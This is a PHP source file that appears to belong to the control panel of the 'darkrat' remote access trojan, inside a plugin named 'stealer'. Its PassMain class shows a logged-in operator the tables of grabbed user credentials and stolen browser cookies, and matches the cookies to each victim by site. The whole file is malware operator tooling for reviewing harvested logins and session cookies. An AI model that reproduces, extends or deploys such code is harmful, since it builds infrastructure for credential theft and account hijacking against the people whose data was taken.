<?php

class PassMain{
    public function __construct()
    {

        $GLOBALS["template"][0] = get_plugin_base_dir("stealer") . "/template/passmain";
    }


    public function passrecovery(){
        if(empty($_SESSION["darkrat_userid"])) {
            die("Login Required");
        }
        $statement = $GLOBALS["pdo"]->prepare("SELECT * FROM grabbed_users");
        $result = $statement->execute(array());
        $rows = $statement->fetchAll(PDO::FETCH_ASSOC);
        $GLOBALS["tpl"]->assign("allusers",$rows);
    }


    public function cookiemanager($id){
        if(empty($_SESSION["darkrat_userid"])) {
            die("Login Required");
        }
        $GLOBALS["template"][0] ="Main";
        $GLOBALS["template"][1] ="cookiemanager";
        $statement = $GLOBALS["pdo"]->prepare("SELECT *, grabbed_users.id as userid FROM grabbed_cookies 
            LEFT JOIN grabbed_users ON instr( grabbed_users.site, grabbed_cookies.site) > 0
            WHERE grabbed_users.id = ?");
        $result = $statement->execute(array($id));
        $userinfo = $statement->fetchAll(PDO::FETCH_ASSOC);
        $GLOBALS["tpl"]->assign("userinfo", $userinfo);
    }
}